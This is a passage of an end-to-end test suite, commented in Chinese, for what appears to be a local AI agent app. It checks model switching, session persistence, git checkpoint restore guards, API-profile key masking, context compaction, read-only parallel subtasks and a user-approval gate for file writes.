    await test('/api/info 暴露上下文窗口（用量条的分母）', async () => {
      const r = await req(base, 'GET', '/api/info');
      assert(r.json.contextWindow > 0, `应给出上下文窗口大小，实际 ${r.json.contextWindow}`);
      assert(r.json.compact, '应给出压缩配置');
      assert(typeof r.json.compact.threshold === 'number', '压缩阈值应是数字');
    });

    await test('/api/models 能拉到模型列表（用户不用手打模型名）', async () => {
      const r = await req(base, 'POST', '/api/models', {
        baseUrl: `http://127.0.0.1:${model.port}/v1`,
        apiFormat: 'openai',
        apiKey: 'mock-key',
      });
      assert(r.json.ok, `拉取失败：${r.json.error}`);
      const ids = r.json.models.map((m) => m.id);
      assert(ids.includes('mock-model'), `列表里应有 mock-model：${JSON.stringify(ids)}`);
      assert(ids.length >= 3, `应返回全部模型：${JSON.stringify(ids)}`);
      assert(r.json.format, '应回显实际使用的协议');
      assert(
        r.json.models.every((m) => m.id),
        '每个模型都要有 id',
      );
    });

    await test('/api/models 失败时返回可读原因而不是 500', async () => {
      // 指向一个没有 /models 的地址（用不存在的端口模拟连不上）
      const r = await req(base, 'POST', '/api/models', {
        baseUrl: 'http://127.0.0.1:1/v1',
        apiFormat: 'openai',
        apiKey: 'k',
      });
      assert(r.status === 200, `不该是 5xx，实际 ${r.status}`);
      assert(r.json.ok === false, '应报告失败');
      assert(r.json.error && r.json.error.length > 0, '要给出原因，界面才能提示用户手填');
    });

    await test('上下文用量通过 SSE 推送，并带窗口大小', async () => {
      const ctxEvents = events.filter((e) => e.type === 'context');
      assert(ctxEvents.length >= 1, '没有收到 context 事件');
      const last = ctxEvents[ctxEvents.length - 1].context;
      assert(last.window > 0, `窗口大小应为正，实际 ${JSON.stringify(last)}`);
      assert(last.used > 0, `应估算出用量，实际 ${JSON.stringify(last)}`);
      assert(last.messages >= 2, '应记录消息条数');
    });

    await test('切换模型只改 model 一个字段（输入区那个按钮就是这么切）', async () => {
      // 用户要求「在对话框位置加一个更换模型的按钮」。
      // 按钮走的就是这个接口：只发 model，其余配置一个字都不能动——
      // 换个模型要是顺手把 API Key 或地址清了，那是灾难。
      const before = await req(base, 'GET', '/api/info');
      assert(before.json.hasApiKey, '前置条件：应该已经配好 Key');
      const baseUrlBefore = before.json.baseUrl;

      const r = await req(base, 'POST', '/api/settings', { model: 'gpt-4' });
      assert(r.status === 200 && r.json.ok, `切换失败：${r.text}`);

      const after = await req(base, 'GET', '/api/info');
      assert(after.json.model === 'gpt-4', `模型没换过去：${after.json.model}`);
      assert(
        after.json.baseUrl === baseUrlBefore,
        `接口地址被改动了（${baseUrlBefore} → ${after.json.baseUrl}），切换模型不该碰它`,
      );
      assert(after.json.hasApiKey, 'API Key 被清掉了，切换模型不该碰它');

      // 上下文窗口默认按模型名推断，换了模型分母必须跟着变，
      // 否则用量条会一直按旧窗口算百分比（看起来没问题，其实早就快满了）
      assert(
        after.json.contextWindow === 8192,
        `gpt-4 的窗口应该是 8192，实际 ${after.json.contextWindow}`,
      );

      const back = await req(base, 'POST', '/api/settings', { model: 'mock-model' });
      assert(back.json.ok, '切回原模型失败');
      const restored = await req(base, 'GET', '/api/info');
      assert(restored.json.model === 'mock-model', '没切回原模型');
      assert(
        restored.json.contextWindow === 128000,
        `切回后窗口应该恢复，实际 ${restored.json.contextWindow}`,
      );
    });

    await test('磁盘上的历史会话会被列出来（关掉再打开对话还在）', async () => {
      // 真实场景：程序重启后内存是空的，但对话文件还在磁盘上。
      // 早期版本 GET /api/sessions 只返回内存里的，于是「关掉软件再打开，
      // 我的对话全没了」——数据没丢，只是从来没被列出来过。
      const cfg = JSON.parse(fs.readFileSync(path.join(sandbox, 'config.json'), 'utf8'));
      const dir = path.join(sandbox, (cfg.session && cfg.session.dir) || '.mya/sessions');
      fs.mkdirSync(dir, { recursive: true });
      const id = '2026-01-01-diskonly';
      fs.writeFileSync(
        path.join(dir, `${id}.json`),
        JSON.stringify({
          id,
          title: '只存在于磁盘的会话',
          createdAt: '2026-01-01T00:00:00.000Z',
          updatedAt: '2026-01-01T00:00:00.000Z',
          cwd: sandbox,
          model: 'mock-model',
          provider: 'custom',
          usage: { promptTokens: 10, completionTokens: 5, totalTokens: 15, calls: 1 },
          context: { used: 100, window: 128000, messages: 3, compacted: 0 },
          messages: [
            { role: 'system', content: '你是助手' },
            { role: 'user', content: '磁盘上的老对话' },
            { role: 'assistant', content: '在的' },
          ],
        }),
        'utf8',
      );

      const list = await req(base, 'GET', '/api/sessions');
      const found = list.json.sessions.find((s) => s.id === id);
      assert(found, `列表里应该有磁盘上的会话：${JSON.stringify(list.json.sessions.map((s) => s.id))}`);
      assert(found.title === '只存在于磁盘的会话', `标题要读出来，实际 ${found.title}`);
      assert(found.saved === true, '应标明它来自磁盘');
      assert(found.cwd === sandbox, `工作目录要一起给出来，实际 ${found.cwd}`);
      assert(found.updatedAt > 0, '更新时间应是毫秒数（前端要算「几分钟前」）');

      // 历史也要能读出来（点进去就能接着聊）
      const hist = await req(base, 'GET', `/api/history?id=${id}`);
      assert(hist.status === 200, `应能恢复磁盘会话，实际 ${hist.status}`);
      assert(hist.json.blocks.some((b) => b.type === 'user' && /磁盘上的老对话/.test(b.text)), '应还原出用户消息');

      // 删除也要能删掉「只在磁盘上」的会话（早期版本这里返回 false，点了没反应）
      const del = await req(base, 'POST', '/api/sessions/delete', { sessionId: id });
      assert(del.json.removed === true, '磁盘会话也应该能被删除');
      assert(!fs.existsSync(path.join(dir, `${id}.json`)), '文件应该真的被删掉');
    });

    await test('每一步的 token 会被记录下来', async () => {
      // 用户要求「每一步要计算 token」：一次请求模型算一步
      const hist = await req(base, 'GET', `/api/history?id=${sessionId}`);
      const steps = hist.json.blocks.filter((b) => b.type === 'step');
      assert(steps.length >= 2, `应该有两步（读了文件、再作答）：${JSON.stringify(hist.json.blocks.map((b) => b.type))}`);
      const withUsage = steps.find((s) => s.usage && s.usage.totalTokens > 0);
      assert(withUsage, `每一步都要带 token 数：${JSON.stringify(steps)}`);
      assert(withUsage.usage.promptTokens > 0, '应记录输入 token');
      assert(withUsage.cumulative && withUsage.cumulative.totalTokens > 0, '应给出累计值');
      // 累计值是权威值（来自服务端），不能被重复累加成两倍
      const last = steps[steps.length - 1];
      assert(
        last.cumulative.totalTokens <= 62 * steps.length,
        `累计值不该翻倍：${JSON.stringify(last.cumulative)}`,
      );
    });

    await test('新建会话可以指定工作目录', async () => {
      const other = path.join(sandbox, 'another-dir');
      fs.mkdirSync(other, { recursive: true });

      const created = await req(base, 'POST', '/api/sessions', { title: '带目录的会话', cwd: other });
      assert(created.json.ok, `创建失败：${created.json.error}`);
      assert(created.json.session.cwd === other, `会话应该用选定的目录，实际 ${created.json.session.cwd}`);

      const hist = await req(base, 'GET', `/api/history?id=${created.json.session.id}`);
      assert(hist.json.session.cwd === other, '恢复出来的会话也要带着目录');
      assert(Array.isArray(hist.json.blocks), '历史结构正常');
      await req(base, 'POST', '/api/sessions/delete', { sessionId: created.json.session.id });
    });

    await test('工作目录不存在时明确报错，并支持「顺便建出来」', async () => {
      const missing = path.join(sandbox, 'not-there-yet');
      const bad = await req(base, 'POST', '/api/sessions', { cwd: missing });
      assert(bad.status === 400, `应返回 400，实际 ${bad.status}`);
      assert(/不存在/.test(bad.json.error), `错误要说清原因：${bad.json.error}`);

      const created = await req(base, 'POST', '/api/sessions', { cwd: missing, createDir: true });
      assert(created.json.ok, `允许创建时应该成功：${created.json.error}`);
      assert(fs.existsSync(missing), '目录应该被建出来');
      await req(base, 'POST', '/api/sessions/delete', { sessionId: created.json.session.id });

      // 目录检查接口：合法的目录要能列出子目录（浏览器模式靠它当目录浏览器）
      const check = await req(base, 'POST', '/api/fs/check-dir', { path: sandbox });
      assert(check.json.ok, '应该认得这个目录');
      assert(Array.isArray(check.json.dirs) && check.json.dirs.includes('another-dir'), `子目录列表不对：${JSON.stringify(check.json.dirs)}`);
    });

    await test('git 检查点接口：能打点/能看改动/能回滚，且不接受任意 ref', async () => {
      // 这些接口会读写 git 对象，所以边界要盯死：
      // 只认本工具创建的检查点命名空间，绝不能被当成「把工作区 checkout 到任意提交」的入口。
      const ck = require(path.join(ROOT, 'src', 'checkpoint.js'));
      const { spawnSync } = require('child_process');
      const gitBin = spawnSync('git', ['--version'], { encoding: 'utf8', windowsHide: true });
      const hasGit = !gitBin.error && gitBin.status === 0;

      if (!hasGit) {
        // 没有 git 的环境：接口应当如实说「不是仓库」，而不是抛异常
        const notRepo = await req(base, 'POST', '/api/checkpoint/create', { label: 'x' });
        assert(notRepo.status === 400, `没有 git 时应当明确失败，实际 ${notRepo.status}`);
        const list = await req(base, 'GET', '/api/checkpoints');
        assert(list.json.isRepo === false, '应当如实说这不是仓库');
        return;
      }

      // 把沙箱工作目录变成真仓库：只有真仓库才能验证「打点 / 回滚 / ref 防护」整条路
      const git = (args) => spawnSync('git', args, { cwd: sandbox, encoding: 'utf8', windowsHide: true }).stdout.trim();
      git(['init', '-q']);
      git(['config', 'user.email', 'e2e@local']);
      git(['config', 'user.name', 'e2e']);
      fs.writeFileSync(path.join(sandbox, 'ck-e2e.txt'), 'v1\n');
      git(['add', '-A']);
      git(['commit', '-qm', 'init']);

      const created = await req(base, 'POST', '/api/checkpoint/create', { label: 'e2e' });
      assert(created.json.ok && created.json.ref, `打点应成功：${JSON.stringify(created.json)}`);
      const ref = created.json.ref;
      assert(ref.startsWith('refs/mya/checkpoints/'), `ref 应当在自己的命名空间里：${ref}`);

      const list = await req(base, 'GET', '/api/checkpoints');
      assert(list.json.isRepo === true, '现在应当是仓库了');
      assert(list.json.list.some((x) => x.ref === ref), '列表里应当有这个检查点');

      const diff = await req(base, 'POST', '/api/checkpoint/diff', { ref });
      assert(diff.json.ok, `看改动应当成功：${JSON.stringify(diff.json)}`);
      assert(Array.isArray(diff.json.files), '应当返回文件列表');

      // 防护一：不是我们的 ref → 400（否则这就是个任意 checkout 接口）
      const bad = await req(base, 'POST', '/api/checkpoint/restore', { ref: 'HEAD' });
      assert(bad.status === 400, `任意 ref 必须被拒（实际 ${bad.status}）`);
      // 防护二：命名空间对但不存在 → 404
      const ghost = await req(base, 'POST', '/api/checkpoint/restore', { ref: `${ck.REF_PREFIX}/19700101000000-0000000` });
      assert(ghost.status === 404, `不存在的检查点应当 404（实际 ${ghost.status}）`);

      // 真回滚：改坏文件 → 回滚 → 内容回来
      fs.writeFileSync(path.join(sandbox, 'ck-e2e.txt'), 'v2 被改坏了\n');
      const restored = await req(base, 'POST', '/api/checkpoint/restore', { ref });
      assert(restored.json.ok, `回滚应当成功：${JSON.stringify(restored.json)}`);
      const after = fs.readFileSync(path.join(sandbox, 'ck-e2e.txt'), 'utf8').replace(/\r\n/g, '\n');
      assert(after === 'v1\n', `回滚后文件内容应当恢复，实际 ${JSON.stringify(after)}`);
    });

    await test('工作区接口：文件夹即工作区，会话挂它下面，归档与移除都有边界', async () => {
      // 这一段是「侧栏改成工作区树」的服务端契约：
      //   · 工作区 = 文件夹；会话所在的文件夹自动算工作区（升级后老会话不会消失）
      //   · 归档不删会话，只换分组；被归档的仍然算在会话数里
      //   · 有会话的工作区不允许「移除」（移了也会被会话带回来，等于骗人）
      const wsDir = path.join(sandbox, 'ws-probe');
      fs.mkdirSync(wsDir, { recursive: true });

      const empty = await req(base, 'GET', '/api/workspaces');
      assert(empty.json.ok, '工作区接口应当可用');
      assert(!empty.json.list.some((w) => w.path === wsDir), '还没建过的文件夹不该出现在列表里');

      const added = await req(base, 'POST', '/api/workspaces', { path: wsDir });
      assert(added.json.ok, `新增工作区应当成功：${JSON.stringify(added.json)}`);
      assert(added.json.list.some((w) => w.path === wsDir && w.sessionCount === 0), '新增后应当在列表里且会话数为 0');
      const again = await req(base, 'POST', '/api/workspaces', { path: wsDir });
      assert(again.json.existed === true, '重复新增要如实说「已存在」');

      const bad = await req(base, 'POST', '/api/workspaces', { path: path.join(sandbox, '不存在-xyz') });
      assert(bad.status === 400, '目录不存在应当 400');

      // 在这个文件夹里建会话：工作区计数要跟着变
      const chosen = await req(base, 'POST', '/api/sessions', { title: '工作区里的会话', cwd: wsDir });
      assert(chosen.json.ok !== false, `建会话应当成功：${JSON.stringify(chosen.json)}`);
      const sid = chosen.json.session.id;
      const listed = await req(base, 'GET', '/api/workspaces');
      const mine = listed.json.list.find((w) => w.path === wsDir);
      assert(mine && mine.sessionCount >= 1, `工作区下应当有会话：${JSON.stringify(mine)}`);

      // 归档：不删，只换组
      const arch = await req(base, 'POST', '/api/sessions/archive', { sessionId: sid, archived: true });
      assert(arch.json.ok && arch.json.archived === true, `归档应当成功：${JSON.stringify(arch.json)}`);
      const inList = arch.json.sessions.find((s) => s.id === sid);
      assert(inList && inList.archived === true, '返回的会话列表里要带 archived=true');
      const afterArch = await req(base, 'GET', '/api/workspaces');
      const mine2 = afterArch.json.list.find((w) => w.path === wsDir);
      assert(mine2.archivedCount >= 1, '工作区要能报出「其中几个已归档」');
      assert(mine2.sessionCount >= 1, '归档的会话仍然算在这个工作区下（不是删掉）');

      // 取回：状态要能还原
      const un = await req(base, 'POST', '/api/sessions/archive', { sessionId: sid, archived: false });
      assert(un.json.sessions.find((s) => s.id === sid).archived === false, '取消归档要能还原');

      // 有会话时移除 → 400 且说清原因
      const rm = await req(base, 'POST', '/api/workspaces/remove', { path: wsDir });
      assert(rm.status === 400, `有会话时移除应当被拒（实际 ${rm.status}）`);
      assert(/还有 \d+ 个会话/.test(String(rm.json.error)), `要说清为什么：${rm.json.error}`);

      // 删掉会话后就能移除（目录和文件都不动）
      await req(base, 'POST', '/api/sessions/delete', { sessionId: sid });
      const rm2 = await req(base, 'POST', '/api/workspaces/remove', { path: wsDir });
      assert(rm2.json.ok, `没有会话时应当能移除：${JSON.stringify(rm2.json)}`);
      assert(!rm2.json.list.some((w) => w.path === wsDir), '移除后不该还在列表里');
      assert(fs.existsSync(wsDir), '移除只是从列表里去掉，不能删用户的文件夹');
    });


    await test('API 库接口：存档只回掩码，切换要真的把配置切过去（并落盘）', async () => {
      // 服务端契约：
      //   · 列表只回掩码（明文 Key 不出网）
      //   · 「存为一条」用当前生效的配置
      //   · 「切换」= 写配置 + 重建 provider（所以 /api/info 必须立刻反映新值）
      //
      // ⚠ 这条测试会**真的改掉当前接入**，所以开头先把原配置存成基线，
      //   结尾切回来再删掉基线。不这么做，后面的测试就会跑在"被我切走的上游"上
      //   （第一版就是这样：切到 api.deepseek.com 之后，压缩/子任务测试全超时）。
      const baseline = await req(base, 'POST', '/api/api-profiles/capture', { name: 'e2e-基线（跑完会删）' });
      assert(baseline.json.ok && baseline.json.created, `存基线应当成功：${JSON.stringify(baseline.json).slice(0, 120)}`);
      const baselineId = baseline.json.profile.id;

      try {
        const empty = await req(base, 'GET', '/api/api-profiles');
        assert(empty.json.ok, 'API 库接口应当可用');
        assert(Array.isArray(empty.json.list), 'list 要是数组');

        // 存一条：地址末尾斜杠要被规整掉
        const made = await req(base, 'POST', '/api/api-profiles', {
          name: 'e2e-官方', provider: 'deepseek', baseUrl: 'https://api.deepseek.com/v1/',
          model: 'deepseek-chat', apiFormat: 'openai', apiKey: 'sk-e2e-secret-123456',
        });
        assert(made.json.ok && made.json.created, `新建应当成功：${JSON.stringify(made.json).slice(0, 120)}`);
        const id = made.json.profile.id;
        assert(made.json.profile.baseUrl === 'https://api.deepseek.com/v1', '地址末尾斜杠要规整');
        assert(!JSON.stringify(made.json).includes('sk-e2e-secret-123456'), '响应里绝不能出现明文 Key');
        assert(/^sk-e/.test(made.json.profile.keyMasked), `要有掩码：${made.json.profile.keyMasked}`);

        // 空名字要拒绝
        const blank = await req(base, 'POST', '/api/api-profiles', { name: '', provider: 'custom', baseUrl: 'https://x/v1', model: 'm' });
        assert(blank.status === 400, `空名字应当 400（实际 ${blank.status}）`);

        // 切换：切过去之后 /api/info 的 provider/model 要跟着变
        const before = await req(base, 'GET', '/api/info');
        const act = await req(base, 'POST', '/api/api-profiles/activate', { id });
        assert(act.json.ok, `切换应当成功：${JSON.stringify(act.json).slice(0, 140)}`);
        const after = await req(base, 'GET', '/api/info');
        assert(after.json.provider === 'deepseek', `切换后 provider 应当是 deepseek（实际 ${after.json.provider}）`);
        assert(after.json.model === 'deepseek-chat', `切换后 model 应当是 deepseek-chat（实际 ${after.json.model}）`);
        assert(after.json.model !== before.json.model || after.json.provider !== before.json.provider, '切换应当真的改变了当前配置');

        // activeId 要记住（界面据此显示"使用中"）
        const listed = await req(base, 'GET', '/api/api-profiles');
        assert(listed.json.activeId === id, `activeId 应当是刚切的那条（实际 ${listed.json.activeId}）`);
        assert(listed.json.list.find((p) => p.id === id)?.active === true, '列表里该条要标 active');

        // 切换不存在的存档 → 400 且有话说
        const ghost = await req(base, 'POST', '/api/api-profiles/activate', { id: 'ghost' });
        assert(ghost.status === 400 && /不在了/.test(String(ghost.json.error)), `切不存在的要明确报错：${ghost.json.error}`);

        // 「把当前配置存为一条」：存的应当是切换后的当前值
        const cap = await req(base, 'POST', '/api/api-profiles/capture', { name: 'e2e-当前快照' });
        assert(cap.json.ok && cap.json.created, `存快照应当成功：${JSON.stringify(cap.json).slice(0, 120)}`);
        assert(cap.json.profile.model === 'deepseek-chat' && cap.json.profile.provider === 'deepseek', '快照要等于当前生效的配置');
        assert(cap.json.profile.hasKey === true, '快照应当把当前 Key 一起存下来（否则切回去连不上）');

        // 删除 + 不存在
        const del = await req(base, 'POST', '/api/api-profiles/remove', { id });
        assert(del.json.ok, `删除应当成功：${JSON.stringify(del.json).slice(0, 120)}`);
        assert(del.json.activeId === '', '删掉正在用的那条后 activeId 要清空');
        const del2 = await req(base, 'POST', '/api/api-profiles/remove', { id: 'nope' });
        assert(del2.status === 400, '删不存在的应当 400');
        await req(base, 'POST', '/api/api-profiles/remove', { id: cap.json.profile.id });
      } finally {
        // 无论断言怎么挂，都要把沙箱的接入切回基线并清理干净
        await req(base, 'POST', '/api/api-profiles/activate', { id: baselineId });
        await req(base, 'POST', '/api/api-profiles/remove', { id: baselineId });
        const back = await req(base, 'GET', '/api/info');
        assert(back.json.model === baseline.json.profile.model, `收尾要把配置切回基线（实际 ${back.json.model}）`);
      }
    });

    await test('手动压缩上下文（按钮走的就是这个接口）', async () => {
      // 默认是自动压（阈值 0.62）；这里显式改成手动，验证「按键才压」这条路仍然可靠
      const info = await req(base, 'GET', '/api/info');
      assert(info.json.compact.auto === true, `默认应该是自动压缩（阈值留余量）：${JSON.stringify(info.json.compact)}`);

      // 先改压缩配置再重扫插件：插件在 setup 时读一次配置，
      // 顺序反了就会用到旧值（这正是「改了设置没生效」的经典原因）
      await req(base, 'POST', '/api/settings', { compact: { enabled: true, auto: false, keepRecent: 4 } });

      // 沙箱的 plugins 目录是空的（为了隔离），压缩能力来自插件，
      // 所以先把自带的 context-compact 拷进来——顺便也验证一次「重扫插件」
      fs.cpSync(path.join(ROOT, 'plugins', 'context-compact'), path.join(sandbox, 'plugins', 'context-compact'), {
        recursive: true,
      });
      const reload = await req(base, 'POST', '/api/plugins/reload', {});
      assert(reload.json.ok, `插件重扫失败：${reload.json.error}`);

      const session = await req(base, 'POST', '/api/sessions', { title: '压缩测试' });
      const sid = session.json.session.id;
      // 注意：不要清空共享的 events 数组——后面的用例还依赖它。
      // 用「这个会话的 done 事件数量」来等本轮结束。
      const doneCount = () => events.filter((e) => e.type === 'done' && e.sessionId === sid).length;
      // 5 轮：每轮产生 4 条消息，加上 system 一共 21 条，
      // 够插件默认的「至少 10 条可压缩内容」门槛
      for (let i = 0; i < 5; i += 1) {
        const seen = doneCount();
        // eslint-disable-next-line no-await-in-loop
        await req(base, 'POST', '/api/message', { sessionId: sid, text: `读一下 probe.txt 第${i}次` });
        // eslint-disable-next-line no-await-in-loop
        await waitFor(`第 ${i} 轮结束`, () => doneCount() > seen, 20000);
      }

      const before = await req(base, 'GET', `/api/history?id=${sid}`);
      const usedBefore = before.json.context.used;

      const compacted = await req(base, 'POST', '/api/compact', { sessionId: sid });
      assert(compacted.json.ok, `压缩失败：${compacted.json.error}`);
      assert(/已压缩/.test(compacted.json.message), `应返回结果说明：${compacted.json.message}`);

      const after = await req(base, 'GET', `/api/history?id=${sid}`);
      const blocks = after.json.blocks.filter((b) => b.type === 'compaction');
      assert(blocks.length === 1, `历史里应有一条压缩记录：${JSON.stringify(after.json.blocks.map((b) => b.type))}`);
      assert(blocks[0].removed > 0, '应报告折叠了几条');
      assert(blocks[0].reason === 'manual', `要标明是手动压的，实际 ${blocks[0].reason}`);
      assert(blocks[0].summary && blocks[0].summary.length > 20, `摘要要落到历史里：${blocks[0].summary}`);
      assert(after.json.context.used < usedBefore, `压缩后上下文应该变小：${usedBefore} → ${after.json.context.used}`);

      // 没装/没启用插件时要给出可读原因，而不是 500
      const disabled = await req(base, 'POST', '/api/compact', { sessionId: 'no-such-session' });
      assert(disabled.status === 404, `不存在的会话应 404，实际 ${disabled.status}`);

      await req(base, 'POST', '/api/sessions/delete', { sessionId: sid });
    });

    await test('思考内容通过 SSE 推送，并落进会话历史', async () => {      // 事件流里要有 reasoning（前端据此画思考块）
      const reasoningEvents = events.filter((e) => e.type === 'reasoning');
      assert(reasoningEvents.length >= 1, `没有收到 reasoning 事件，收到：${events.map((e) => e.type).join(',')}`);
      assert(
        reasoningEvents.some((e) => String(e.text).includes('工具结果拿到了')),
        `思考内容不完整：${JSON.stringify(reasoningEvents.map((e) => e.text))}`,
      );

      // 历史里也要有（刷新页面后思考块还在）
      const hist = await req(base, 'GET', `/api/history?id=${sessionId}`);
      const reasoningBlocks = hist.json.blocks.filter((b) => b.type === 'reasoning');
      assert(reasoningBlocks.length >= 1, `历史里缺少思考块：${JSON.stringify(hist.json.blocks.map((b) => b.type))}`);
      assert(reasoningBlocks[0].text.includes('工具结果拿到了'), '思考块内容不对');
      // 历史接口也要给出上下文用量
      assert(hist.json.context && hist.json.context.window > 0, '历史接口应带上上下文用量');
    });

    /* ---------------- 3.5 并行子任务 ---------------- */
    await test('并行子任务：父任务拆两个 → 并行跑（只读工具）→ 摘要回填', async () => {
      events.length = 0;
      const before = model.gatewayCalls.child;
      const r = await req(base, 'POST', '/api/message', { sessionId, text: '并行读 a.txt 和 b.txt' });
      assert(r.json.ok, `发送失败：${r.json.error}`);
      await waitFor('并行任务跑完（done 事件）', () => events.some((e) => e.type === 'done'), 30000);

      // 1) 父任务确实拆了（假网关看到「一口气拆多个」的批次）
      assert(model.gatewayCalls.spawnBatches >= 1, '父任务没有拆子任务');

      // 2) 子任务真的跑了，而且**拿不到**写/执行类工具（掩码注册表的硬约束）
      const childRuns = model.gatewayCalls.child - before;
      if (process.env.MYA_DEBUG) {
        console.log('    [调试] 网关调用序列：');
        for (const [i, r] of model.requests.entries()) {
          const msgs = r.messages || [];
          const lm = msgs.map((m) => m.role).lastIndexOf('user');
          const tmsgs = msgs.slice(lm).filter((m) => m.role === 'tool');
          console.log(
            `      #${i} msgs=${msgs.length} tools=[${(r.tools || []).map((t) => t.function && t.function.name).join(',')}] toolMsgs=${tmsgs.length} lastUser=${JSON.stringify(String((msgs[lm] || {}).content || '').slice(0, 18))}`,
          );
        }
        console.log('    [调试] gatewayCalls =', JSON.stringify(model.gatewayCalls));
      }
      const dump = model.requests.slice(-3).map((r, i) => {
        const msgs = r.messages || [];
        const tools = (r.tools || []).length;
        const toolMsgs = msgs.filter((m) => m.role === 'tool');
        return `#${i} msgs=${msgs.length} tools=${tools} toolMsgs=${toolMsgs.length} :: ${toolMsgs
          .map((m) => String(m.content || '').replace(/\s+/g, ' ').slice(0, 60))
          .join(' | ')}`;
      });
      assert(
        childRuns >= 2,
        `应该有两个子任务请求，实际 ${childRuns}；calls=${JSON.stringify(model.gatewayCalls)}；最近请求：${dump.join('  ///  ')}`,
      );
      const childToolSets = model.gatewayCalls.childTools.slice(-childRuns);
      assert(
        childToolSets.every((s) => !/write|edit|shell/.test(s)),
        `子任务不该拿到写/执行工具，实际：${childToolSets.join(' | ')}`,
      );
      assert(childToolSets.every((s) => s.includes('read')), `子任务应该有 read：${childToolSets.join(' | ')}`);

      // 3) 父任务收到的是带边界的摘要（防提示词注入的那层包装）
      assert(model.gatewayCalls.parentSawSubtaskResult, '父任务的工具结果里没有 <subtask-result> 边界');

      // 4) 界面上能看到任务块，而且状态收敛到 done
      const blocks = events.filter((e) => e.type === 'block').map((e) => e.block);
      const taskBlocks = blocks.filter((b) => b.type === 'task');
      assert(taskBlocks.length >= 2, `应该有 2 个任务块，实际 ${taskBlocks.length}`);
      const updates = events.filter((e) => e.type === 'task_update').map((e) => e.block);
      const finalStates = [...taskBlocks, ...updates].filter((b) => b && b.taskId);
      const doneIds = new Set(finalStates.filter((b) => b.status === 'done').map((b) => b.taskId));
      assert(doneIds.size >= 2, `两个子任务最终都该是 done，实际 ${[...doneIds].join(',')}`);
      assert(
        finalStates.some((b) => b.summary && b.summary.includes('子任务结论')),
        '任务块里要能看到子任务的结论摘要',
      );

      // 5) 会话结束时不该有没跑完的子任务
      const after = await req(base, 'GET', `/api/history?id=${sessionId}`);
      assert(after.json.ok, '拿历史失败');
      const running = (after.json.blocks || []).filter((b) => b.type === 'task' && (b.status === 'running' || b.status === 'queued'));
      assert(running.length === 0, `不该有还在跑的子任务块：${running.map((b) => b.taskId).join(',')}`);
    });

    await test('子任务的 token 计入会话累计（界面上的数字不能偏小）', async () => {
      const r = await req(base, 'GET', `/api/history?id=${sessionId}`);
      assert(r.json.ok, '拿历史失败');
      const usage = r.json.session && r.json.session.usage;
      assert(usage && usage.totalTokens > 0, '应该有累计 token');
      assert(usage.subtaskTokens > 0, `子任务 token 要单独记一份，实际 ${JSON.stringify(usage)}`);
      assert(usage.totalTokens >= usage.subtaskTokens, '总数不能小于子任务那部分');
      /**
       * 事件数组是整套测试共享的。这里必须清干净：
       * 留着刚才那条 done，后面「等本轮结束」的用例会**立刻**返回，
       * 于是它在工具还没跑完时就去读历史，断言看到的是中间态
       * （实测：write 块停在 ok=null，看起来像产品 bug，其实是测试串了）。
       */
      events.length = 0;
    });


    section('3. 对话全链路');

    /* ---------------- 4. 确认闸门 ---------------- */
    section('4. 确认闸门（危险操作挂起等用户决定）');

    await test('危险工具会挂起并推送 approval_request', async () => {
      events.length = 0;
      const r = await req(base, 'POST', '/api/message', { sessionId, text: '帮我写一个文件试试' });
      assert(r.json.ok, `发送失败：${r.json.error}，queued=${r.json.queued} position=${r.json.position}`);

      let approval;
      try {
        approval = await waitFor('确认请求', () => events.find((e) => e.type === 'approval_request'), 20000);
      } catch (err) {
        throw new Error(
          `${err.message}；期间收到的事件：${events
            .map((e) => `${e.type}${e.error || e.message ? `(${e.error || e.message})` : ''}`)
            .join(',')}\n模型收到的请求：${JSON.stringify(model.log.slice(-3), null, 1)}`,
        );
      }
      assert(approval.approval.question.includes('write'), `确认文案不对：${approval.approval.question}`);
      assert(approval.approval.sessionId === sessionId, '确认请求应带上会话 id');

      // 关键：用户还没点同意，文件绝不能存在
      assert(!fs.existsSync(path.join(sandbox, 'approval-probe.txt')), '用户还没同意，文件不该被写入');

      const deny = await req(base, 'POST', '/api/approve', { id: approval.approval.id, approved: false });
      assert(deny.json.ok, '拒绝请求失败');

      await waitFor('本轮结束', () => events.some((e) => e.type === 'done'), 20000);

      assert(!fs.existsSync(path.join(sandbox, 'approval-probe.txt')), '拒绝之后文件仍不该存在');

      const hist = await req(base, 'GET', `/api/history?id=${sessionId}`);
      const toolBlock = hist.json.blocks.filter((b) => b.type === 'tool').find((b) => b.name === 'write');
      assert(toolBlock, '应该有 write 工具块');
      const allTool = (hist.json.blocks || []).filter((b) => b.type === 'tool').map((b) => `${b.seq}:${b.name}:ok=${b.ok}`);
      const evTool = events
        .filter((e) => e.type === 'tool_result' || (e.type === 'block' && e.block && e.block.type === 'tool'))
        .map((e) => {
          // tool_result 有两个来源：session-manager（带 block）和 web io（只有 name/info），
          // 所以这里必须防一手——调试代码自己炸掉会把真正的断言结果盖住
          const b = e.block || {};
          return `${e.type}(${b.name || e.name || '?'}:${b.ok})`;
        })
        .join(' , ');
      assert(
        toolBlock.ok === false,
        `被拒绝的工具应标记为失败；工具块：${allTool.join(' , ')}；工具事件：${evTool.slice(0, 400)}`,
      );
      assert(
        String(toolBlock.output).includes('拒绝'),
        `工具输出应该说清是被拒绝：${String(toolBlock.output).slice(0, 120)}`,
      );
    });

    await test('允许之后文件真的被写入', async () => {
      events.length = 0;
      await req(base, 'POST', '/api/message', { sessionId, text: '再写一次这个文件' });

      const approval = await waitFor('确认请求', () => events.find((e) => e.type === 'approval_request'), 20000);
      await req(base, 'POST', '/api/approve', { id: approval.approval.id, approved: true });

      await waitFor('本轮结束', () => events.some((e) => e.type === 'done'), 20000);

      const file = path.join(sandbox, 'approval-probe.txt');
      assert(fs.existsSync(file), '允许之后文件应该被创建');
      assert(fs.readFileSync(file, 'utf8').includes('只有用户允许'), '文件内容不对');
      fs.unlinkSync(file);
    });

    /* ---------------- 5. 插件装卸 ---------------- */
    section('5. 插件安装 / 启停 / 卸载');

    // 手工造一个本地插件放到沙箱里，测启停和卸载（不经过 GitHub）
    let pluginDirPath = '';
    await test('重扫插件目录能发现新插件', async () => {
      const dir = path.join(sandbox, 'plugins', 'local-test');
      fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify({ name: 'local-test', version: '1.0.0', entry: 'index.js', description: '本地测试插件' }));
      fs.writeFileSync(
        path.join(dir, 'index.js'),
        `module.exports = { name: 'local-test', setup(ctx) { ctx.registerTool({ name: 'local_probe', description: '测试用', parameters: { type: 'object', properties: {} }, async run() { return '本地插件生效了'; } }); } };`,
      );
      pluginDirPath = dir;

      const r = await req(base, 'POST', '/api/plugins/reload', {});
      assert(r.json.ok, '重载失败');
